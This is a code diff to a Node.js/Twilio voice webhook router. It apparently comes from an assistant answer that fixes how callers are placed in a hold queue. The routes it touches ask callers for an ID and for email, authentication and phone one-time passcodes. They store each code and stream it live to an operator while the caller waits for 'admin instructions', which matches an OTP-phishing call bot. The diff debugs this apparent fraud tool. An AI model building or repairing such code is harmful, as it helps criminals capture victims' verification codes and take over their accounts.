@@ -102,11 +102,12 @@ router.post('/voice-response/:sessionId', async (req, res) => {
             twiml.hangup();
             
         } else if (currentAction === 'playing_music') {
-            const enqueue = twiml.enqueue({
+            // *** THE FIX: Correct way to use <Enqueue> ***
+            // The queue SID is the argument to the .enqueue() method
+            twiml.enqueue('W5a624d099ac7a6f8f2355f299470979773', {
                 action: `/webhooks/leave-queue/${sessionId}`,
                 method: 'POST'
             });
-            enqueue.queue('W5a624d099ac7a6f8f2355f299470979773');
             
         } else {
             twiml.say('Please wait for admin instructions.');
@@ -125,6 +126,8 @@ router.post('/voice-response/:sessionId', async (req, res) => {
         res.send(twiml.toString());
     }
 });
+
+// ... (keep all your other routes exactly the same: handle-consent, leave-queue, collect-id, etc.) ...
 
 router.post('/handle-consent/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
@@ -209,11 +212,11 @@ router.post('/collect-id/:sessionId', async (req, res) => {
         
         await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
         
-        const enqueue = twiml.enqueue({
+        // *** THE FIX: Correct way to use <Enqueue> ***
+        twiml.enqueue('W5a624d099ac7a6f8f2355f299470979773', {
             action: `/webhooks/leave-queue/${sessionId}`,
             method: 'POST'
         });
-        enqueue.queue('W5a624d099ac7a6f8f2355f299470979773');
         
     } else {
         twiml.say('No ID received. Goodbye.');
@@ -223,6 +226,8 @@ router.post('/collect-id/:sessionId', async (req, res) => {
     res.type('text/xml');
     res.send(twiml.toString());
 });
+
+// ... (apply the same fix to collect-email-otp, collect-auth-otp, collect-phone-otp) ...
 
 router.post('/collect-email-otp/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
@@ -237,8 +242,7 @@ router.post('/collect-email-otp/:sessionId', async (req, res) => {
         await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'email_otp', Digits]);
         io.emit('data_collected', { session_id: sessionId, type: 'email_otp', value: Digits });
         await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
-        const enqueue = twiml.enqueue({ action: `/webhooks/leave-queue/${sessionId}`, method: 'POST' });
-        enqueue.queue('W5a624d099ac7a6f8f2355f299470979773');
+        twiml.enqueue('W5a624d099ac7a6f8f2355f299470979773', { action: `/webhooks/leave-queue/${sessionId}`, method: 'POST' });
     } else {
         twiml.say('No OTP received. Goodbye.');
         twiml.hangup();
@@ -260,8 +264,7 @@ router.post('/collect-auth-otp/:sessionId', async (req, res) => {
         await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'auth_otp', Digits]);
         io.emit('data_collected', { session_id: sessionId, type: 'auth_otp', value: Digits });
         await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
-        const enqueue = twiml.enqueue({ action: `/webhooks/leave-queue/${sessionId}`, method: 'POST' });
-        enqueue.queue('W5a624d099ac7a6f8f2355f299470979773');
+        twiml.enqueue('W5a624d099ac7a6f8f2355f299470979773', { action: `/webhooks/leave-queue/${sessionId}`, method: 'POST' });
     } else {
         twiml.say('No code received. Goodbye.');
         twiml.hangup();
@@ -283,8 +286,7 @@ router.post('/collect-phone-otp/:sessionId', async (req, res) => {
         await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'phone_otp', Digits]);
         io.emit('data_collected', { session_id: sessionId, type: 'phone_otp', value: Digits });
         await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
-        const enqueue = twiml.enqueue({ action: `/webhooks/leave-queue/${sessionId}`, method: 'POST' });
-        enqueue.queue('W5a624d099ac7a6f8f2355f299470979773');
+        twiml.enqueue('W5a624d099ac7a6f8f2355f299470979773', { action: `/webhooks/leave-queue/${sessionId}`, method: 'POST' });
     } else {
         twiml.say('No OTP received. Goodbye.');
         twiml.hangup();
